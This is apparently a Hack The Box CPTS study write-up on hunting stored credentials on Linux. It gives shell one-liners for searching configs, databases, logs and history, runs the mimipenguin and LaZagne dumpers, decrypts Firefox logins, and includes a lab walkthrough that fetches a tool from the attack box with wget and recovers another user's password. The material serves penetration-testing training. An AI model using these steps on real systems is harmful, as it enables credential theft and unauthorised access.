### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Credential Hunting in Linux <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Credential Hunting in Linux



Search files / history / memory / keyrings for stored creds. Categories:

| Category | Sources |
|---|---|
| Files | configs, DBs, notes, scripts, cronjobs, SSH keys |
| History | logs, `.bash_history` |
| Memory | LSASS-equivalents, in-memory creds |
| Keyrings | browser stores, GNOME/KDE keyring |

#### Find config files (`.conf` / `.config` / `.cnf`)

```diff
+ $ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

<br>

Grep for credential keywords inside found configs:

```diff
+ $ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

<br>

#### Databases

```diff
+ $ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

<br>

#### Notes (txt files + extension-less)

```diff
+ $ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

<br>

#### Scripts

```diff
+ $ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

<br>

#### Cron

```diff
+ $ cat /etc/crontab
+ $ ls -la /etc/cron.*/
```

<br>

#### Bash history & logs

```diff
+ $ tail -n5 /home/*/.bash*
```

<br>

Hunt for auth events / passwords across `/var/log`:

```diff
+ $ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

<br>

Key log files:

| File | Contents |
|---|---|
| `/var/log/auth.log` | (Debian) auth events |
| `/var/log/secure` | (RHEL) auth events |
| `/var/log/syslog` | generic system |
| `/var/log/cron` | cron jobs |
| `/var/log/mysqld.log` | mysql |

#### Memory dumpers

[mimipenguin](https://github.com/huntergregal/mimipenguin) — root-required, parses GDM/SSH/keyring memory:

```diff
+ $ sudo python3 mimipenguin.py
```

<br>

[LaZagne](https://github.com/AlessandroZ/LaZagne) — much broader (browsers, SSH, git, env, AWS, Filezilla, KeePass, etc.):

```diff
+ $ sudo python2.7 laZagne.py all
```

<br>

#### Browser-stored creds (Firefox)

```diff
+ $ cat .mozilla/firefox/<profile>/logins.json | jq .
```

<br>

Decrypt with [firefox_decrypt](https://github.com/unode/firefox_decrypt) (Python 3.9):

```diff
+ $ python3.9 firefox_decrypt.py
```

<br>

Or via LaZagne:

```diff
+ $ python3 laZagne.py browsers
```

<br>

---

<br>

### Exercise

IP: 10.129.252.221 — SSH as `kira` / `L0vey0u1!`.

---

### Question 1:
Examine the target and find out the password of the user Will. Then, submit the password as the answer.

Quick nmap shows SSH/SMB/FTP. SSH in:

```diff
+ $ ssh kira@10.129.252.221
```

<br>

Enumerate users (`/etc/passwd`):

```diff
+ kira@nix01:~$ cat /etc/passwd
```

	kira:x:1000:1000::/home/kira:/bin/bash
	will:x:1001:1001::/home/will:/bin/bash
	sam:x:1002:1003::/home/sam:/bin/bash

<br>

`.bash_history` shows kira ran `firefox_decrypt.py` against profile `ytb95ytb.default-release/`:

```diff
+ kira@nix01:~$ cat .bash_history
```

<br>

Inspect `logins.json`:

```diff
+ kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ cat logins.json | jq .
```

<br>

#### Pull firefox_decrypt down via a quick HTTP server on attack box, run on target:

```diff
+ $ git clone https://github.com/unode/firefox_decrypt.git
+ $ python3 -m http.server
+ kira@nix01:~/.mozilla/firefox$ wget -r -nH http://10.10.14.111:8000/firefox_decrypt
+ kira@nix01:~/.mozilla/firefox/firefox_decrypt$ python3.9 firefox_decrypt.py
```

	Select the Mozilla profile you wish to decrypt
	2 -> ytb95ytb.default-release

	Website:   https://dev.inlanefreight.com
	Username: 'will@inlanefreight.htb'
	Password: 'TUqr7QfLTLhruhVbCP'

&#x1F6A9; found **TUqr7QfLT--edit--LhruhVbCP**.
